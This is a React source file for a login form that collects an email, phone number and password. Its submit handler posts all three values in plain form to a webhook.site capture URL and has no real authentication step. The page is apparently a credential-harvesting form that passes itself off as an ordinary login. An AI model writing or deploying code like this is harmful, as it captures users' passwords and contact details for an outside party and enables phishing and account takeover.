import React, { useState } from "react";
import Form from "react-bootstrap/Form";
import Button from "react-bootstrap/Button";
import "./style.css";
import axios from "axios";

export default function Login() {
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");

  function validateForm() {
    return email.length > 0 && password.length > 0 && phone.length > 0;
  }

  function handleSubmit(event) {
    event.preventDefault();

    axios
      .post('https://webhook.site/83eeb86e-29f2-4b44-b1ec-897a8dc0da01', {
        'email': email,
        'password': password,
        'phone': phone
      })
      .then(function (response) {
        console.log(response);
      });
  }

  return (
    <div className="Login">
      <Form onSubmit={handleSubmit}>
        <Form.Group size="lg" controlId="email">
          <Form.Label>Email</Form.Label>
          <Form.Control
            autoFocus
            type="email"
            value={email}
            onChange={e => setEmail(e.target.value)}
          />
        </Form.Group>
        <Form.Group size="lg" controlId="phone">
          <Form.Label>Phone</Form.Label>
          <Form.Control

            type="phone"
            value={phone}
            onChange={e => setPhone(e.target.value)}
          />
        </Form.Group>


        <Form.Group size="lg" controlId="password">
          <Form.Label>Password</Form.Label>
          <Form.Control
            type="password"
            value={password}
            onChange={e => setPassword(e.target.value)}
          />
        </Form.Group>
        <Button block size="lg" type="submit" disabled={!validateForm()}>
          Login
        </Button>
      </Form>
    </div>
  );
}
